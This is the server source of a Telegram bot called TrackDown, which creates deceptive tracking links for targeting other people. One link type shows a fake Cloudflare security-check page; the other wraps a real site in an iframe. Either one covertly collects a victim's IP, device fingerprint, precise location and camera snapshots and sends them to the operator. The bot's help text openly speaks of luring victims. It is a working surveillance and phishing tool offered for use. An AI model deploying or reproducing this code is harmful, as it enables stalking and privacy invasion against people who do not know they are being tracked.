require('dotenv').config();
const fs = require('fs');
const path = require('path');
const express = require('express');
const serverless = require('serverless-http');
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const ejs = require('ejs');

// Initialize Express app
const app = express();

// Middleware
app.use(bodyParser.json({limit:1024*1024*20, type:'application/json'}));
app.use(bodyParser.urlencoded({ extended:true, limit:1024*1024*20, type:'application/x-www-form-urlencoded' }));
app.use(cors());

// Global variables
const bot = new TelegramBot(process.env.bot);
const hostURL = "https://YOUR-VERCEL-URL-HERE.vercel.app"; // अपना Vercel URL यहां पेस्ट करें
const use1pt = false;

// Get the template paths
const viewsPath = path.join(process.cwd(), 'views');
const webviewTemplate = fs.readFileSync(path.join(viewsPath, 'webview.ejs'), 'utf8');
const cloudflareTemplate = fs.readFileSync(path.join(viewsPath, 'cloudflare.ejs'), 'utf8');

// Helper functions
function getClientIp(req) {
  let ip;
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  return ip;
}

function getFormattedDate() {
  var d = new Date();
  return d.toJSON().slice(0, 19).replace('T', ':');
}

function atob(str) {
  return Buffer.from(str, 'base64').toString();
}

// Create a link function (webhook version)
async function createLink(cid, msg) {
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
    // Show typing indicator
    await bot.sendChatAction(cid, "typing");
    
    // Generate a loading message
    const loadingMsg = await bot.sendMessage(
      cid, 
      "<i>🔄 Generating secure tracking links...</i>", 
      { parse_mode: "HTML" }
    );
    
    // Create the encoded URL
    var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64');
    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;
    
    // Button settings
    var m = {
      parse_mode: "HTML",
      reply_markup: JSON.stringify({
        "inline_keyboard": [
          [
            { text: "🔄 Create New Link", callback_data: "crenew" },
            { text: "📖 Help", callback_data: "help" }
          ]
        ]
      })
    };

    // Simulate processing time
    setTimeout(async () => {
      // Delete the loading message
      await bot.deleteMessage(cid, loadingMsg.message_id);
      
      // Success message with date/time
      const date = new Date();
      const formattedDate = date.toLocaleString('en-US', {
        weekday: 'short',
        month: 'short', 
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      });
      
      if (use1pt) {
        try {
          var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
          var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

          var f = "", g = "";

          for (var c in x) {
            f += x[c] + "\n";
          }

          for (var c in y) {
            g += y[c] + "\n";
          }

          await bot.sendMessage(
            cid, 
            `<b>✅ Tracking Links Generated</b>\n` +
            `<i>${formattedDate}</i>\n\n` +
            `<b>🎯 Target URL:</b> ${msg}\n\n` +
            `<b>📊 TRACKING LINKS:</b>\n\n` +
            `<b>🔒 CloudFlare Security Check</b> (Recommended)\n` +
            `<code>${f}</code>\n\n` +
            `<b>🔎 WebView Page</b>\n` +
            `<code>${g}</code>\n\n` +
            `<i>💡 Send either link to your target. Once they open it, you'll receive their information automatically.</i>`, 
            m
          );
        } catch (error) {
          // If URL shortener fails, send direct links
          await bot.sendMessage(
            cid, 
            `<b>✅ Tracking Links Generated</b>\n` +
            `<i>${formattedDate}</i>\n\n` +
            `<b>🎯 Target URL:</b> ${msg}\n\n` +
            `<b>📊 TRACKING LINKS:</b>\n\n` +
            `<b>🔒 CloudFlare Security Check</b> (Recommended)\n` +
            `<code>${cUrl}</code>\n\n` +
            `<b>🔎 WebView Page</b>\n` +
            `<code>${wUrl}</code>\n\n` +
            `<i>💡 Send either link to your target. Once they open it, you'll receive their information automatically.</i>`, 
            m
          );
        }
      } else {
        // Send direct links
        await bot.sendMessage(
          cid, 
          `<b>✅ Tracking Links Generated</b>\n` +
          `<i>${formattedDate}</i>\n\n` +
          `<b>🎯 Target URL:</b> ${msg}\n\n` +
          `<b>📊 TRACKING LINKS:</b>\n\n` +
          `<b>🔒 CloudFlare Security Check</b> (Recommended)\n` +
          `<code>${cUrl}</code>\n\n` +
          `<b>🔎 WebView Page</b>\n` +
          `<code>${wUrl}</code>\n\n` +
          `<i>💡 Send either link to your target. Once they open it, you'll receive their information automatically.</i>`, 
          m
        );
      }
    }, 1500);
    
    return true;
  } else {
    await bot.sendMessage(
      cid, 
      `<b>⚠️ Invalid URL</b>\n\nPlease enter a valid URL that includes http:// or https://\n\nExample: https://instagram.com`,
      { parse_mode: "HTML" }
    );
    await createNew(cid);
    return false;
  }
}

// Create new request function (webhook version)
async function createNew(cid) {
  var mk = {
    parse_mode: "HTML",
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  await bot.sendAnimation(
    cid, 
    "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcDd6ZWl2ZXJ0NnEyOHQzaXhxaTdyOXgxdWxrdWE4aWdkcmV3dXd6aiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/077i6AULCXc0FKTj9s/giphy.gif",
    { caption: "<b>🔗 Enter the destination URL</b>\n\nThis is the website your target will see after their information is collected.\n\n<i>Example: https://instagram.com</i>", parse_mode: "HTML" }
  );
  
  setTimeout(async () => {
    await bot.sendMessage(cid, `<b>🌐 Enter Your URL:</b>\n<i>Include http:// or https://</i>`, mk);
  }, 500);
}

// ROUTES

// Root route - returns the client IP
app.get("/", (req, res) => {
  const ip = getClientIp(req);
  res.json({"ip": ip});
});

// POST route for device information
app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  
  var ip = getClientIp(req);
    
  if (uid != null && data != null) {
    if (data.indexOf(ip) < 0) {
      return res.send("ok");
    }
    
    data = data.replaceAll("<br>", "\n");
    
    // Send a fancy alert with target information
    bot.sendMessage(
      parseInt(uid, 36), 
      `<b>🔔 TARGET DETECTED</b>\n\n` +
      `<i>Information collection has begun. Data will arrive shortly.</i>`,
      {parse_mode: "HTML"}
    );
    
    // Add a small delay to make it look like processing is happening
    setTimeout(() => {
      bot.sendMessage(parseInt(uid, 36), data, {parse_mode: "HTML"});
    }, 800);
    
    res.send("Done");
  } else {
    res.status(400).send("Bad Request");
  }
});

// Location route
app.post("/location", async (req, res) => {
  try {
    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    var uid = decodeURIComponent(req.body.uid) || null;
    var acc = decodeURIComponent(req.body.acc) || null;
    
    if (lon != null && lat != null && uid != null && acc != null) {
      await bot.sendLocation(parseInt(uid, 36), lat, lon);
      await bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
      
      res.send("Done");
    } else {
      res.status(400).send("Bad Request");
    }
  } catch (error) {
    console.error("Error in location handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Camera snapshot route
app.post("/camsnap", async (req, res) => {
  try {
    var uid = decodeURIComponent(req.body.uid) || null;
    var img = decodeURIComponent(req.body.img) || null;
      
    if (uid != null && img != null) {
      var buffer = Buffer.from(img, 'base64');
        
      var info = {
        filename: "camsnap.png",
        contentType: 'image/png'
      };
        
      try {
        await bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
      } catch (error) {
        console.log("Error sending photo:", error);
      }
        
      res.send("Done");
    } else {
      res.status(400).send("Bad Request");
    }
  } catch (error) {
    console.error("Error in camsnap handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Webview route
app.get("/w/:uid/:uri", async (req, res) => {
  try {
    const uid = req.params.uid;
    const uri = req.params.uri;
    
    if (!uid || !uri) {
      return res.redirect("https://t.me/th30neand0nly0ne");
    }
    
    const ip = getClientIp(req);
    const time = getFormattedDate();
    
    // Render the template
    const html = ejs.render(webviewTemplate, {
      ip: ip,
      time: time,
      url: atob(uri),
      uid: uid,
      a: hostURL,
      t: use1pt
    });
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error("Error in webview handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Cloudflare route
app.get("/c/:uid/:uri", async (req, res) => {
  try {
    const uid = req.params.uid;
    const uri = req.params.uri;
    
    if (!uid || !uri) {
      return res.redirect("https://t.me/th30neand0nly0ne");
    }
    
    const ip = getClientIp(req);
    const time = getFormattedDate();
    
    // Render the template
    const html = ejs.render(cloudflareTemplate, {
      ip: ip,
      time: time,
      url: atob(uri),
      uid: uid,
      a: hostURL,
      t: use1pt
    });
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error("Error in cloudflare handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Telegram Bot Webhook Handler for production
app.post("/webhook", async (req, res) => {
  try {
    const update = req.body;
    
    // Handle callback queries (button clicks)
    if (update.callback_query) {
      const callbackQuery = update.callback_query;
      await bot.answerCallbackQuery(callbackQuery.id);
      
      if (callbackQuery.data === "crenew") {
        await createNew(callbackQuery.message.chat.id);
      }
      
      return res.status(200).send("OK");
    }
    
    // Handle messages
    if (update.message) {
      const msg = update.message;
      const chatId = msg.chat.id;
      
      // Handle reply to "Enter Your URL" message
      if (msg.reply_to_message && (msg.reply_to_message.text === "🌐 Enter Your URL" || 
          msg.reply_to_message.text.includes("<b>🌐 Enter Your URL:</b>"))) {
        await createLink(chatId, msg.text);
        return res.status(200).send("OK");
      }
      
      // Handle /start command
      if (msg.text === "/start") {
        var m = {
          parse_mode: "HTML",
          reply_markup: JSON.stringify({
            "inline_keyboard": [
              [{ text: "🔗 Create Tracking Link", callback_data: "crenew" }],
              [{ text: "ℹ️ Help", callback_data: "help" }],
              [{ text: "👨‍💻 Developer", url: "https://t.me/th30neand0nly0ne" }]
            ]
          })
        };
        
        await bot.sendMessage(
          chatId, 
          `<b>🎯 Welcome, ${msg.chat.first_name}!</b>\n\n` +
          `<i>TrackDown</i> is an advanced tracking system that allows you to monitor targets with precision.\n\n` +
          `<b>🔍 Capabilities:</b>\n` +
          `• 📱 Complete device information\n` +
          `• 📷 Camera access & snapshots\n` +
          `• 📍 Precise location tracking\n` +
          `• 🌐 Network details & configuration\n` +
          `• 🔋 Battery status monitoring\n` + 
          `• 🧩 Advanced browser fingerprinting\n\n` +
          `<b>Click the button below to create your first tracking link:</b>`, 
          m
        );
      }
      // Handle /create command
      else if (msg.text === "/create") {
        await createNew(chatId);
      }
      // Handle /help command
      else if (msg.text === "/help") {
        await bot.sendMessage(
          chatId,
          `<b>📚 TrackDown Help Guide</b>\n\n` +
          `<b>🔹 Basic Usage:</b>\n` +
          `This powerful tool creates specialized links that extract information from your target when they click. Each link appears legitimate while collecting data in the background.\n\n` +
          `<b>🔹 Link Types:</b>\n\n` +
          `<b>1️⃣ CloudFlare Security Check</b> (Recommended)\n` +
          `• Displays a realistic CloudFlare security verification page\n` +
          `• Collects data while appearing to verify the browser\n` +
          `• Automatically redirects to your specified destination URL\n` +
          `• Works with most target websites\n\n` +
          `<b>2️⃣ WebView Overlay</b>\n` +
          `• Loads your destination site in an iframe\n` +
          `• Collects data while displaying the actual website\n` +
          `• ⚠️ Some sites block iframe loading (e.g., Google, Facebook)\n` +
          `• Best for less restrictive websites\n\n` +
          `<b>🔹 How to Create Links:</b>\n` +
          `1. Click "Create Tracking Link" or type /create\n` +
          `2. Enter a destination URL (must include http:// or https://)\n` +
          `3. Send the generated links to your target\n` +
          `4. Wait for information to be collected\n\n` +
          `<b>💻 Project Repository:</b> <a href="https://github.com/Th30neAnd0nly/TrackDown">GitHub</a>`,
          { parse_mode: "HTML" }
        );
      }
    }
    
    res.status(200).send("OK");
  } catch (error) {
    console.error("Error in webhook handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// For local development
if (process.env.NODE_ENV !== "production") {
  // Start polling for local testing
  console.log("Starting polling for local development...");
  bot.on('callback_query', async (callbackQuery) => {
    await bot.answerCallbackQuery(callbackQuery.id);
    
    if (callbackQuery.data === "crenew") {
      await createNew(callbackQuery.message.chat.id);
    }
  });
  
  bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    
    // Handle reply to "Enter Your URL" message
    if (msg.reply_to_message && msg.reply_to_message.text === "🌐 Enter Your URL") {
      await createLink(chatId, msg.text);
      return;
    }
    
    // Handle /start command
    if (msg.text === "/start") {
      var m = {
        reply_markup: JSON.stringify({
          "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
        })
      };
      
      await bot.sendMessage(
        chatId, 
        `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`, 
        m
      );
    }
    // Handle /create command
    else if (msg.text === "/create") {
      await createNew(chatId);
    }
    // Handle /help command
    else if (msg.text === "/help") {
      await bot.sendMessage(
        chatId,
        ` Through this bot you can track people just by sending a simple link.\n\nSend /create
to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
the url it will send you 2 links which you can use to track people.
\n\nSpecifications.
\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
`
      );
    }
  });
  
  // Start polling
  bot.startPolling();
  
  // Start the server for the web routes
  app.listen(5000, '0.0.0.0', () => {
    console.log("Server running on port 5000");
  });
}

// Export the handler for serverless deployment
module.exports = app;
module.exports.handler = serverless(app);
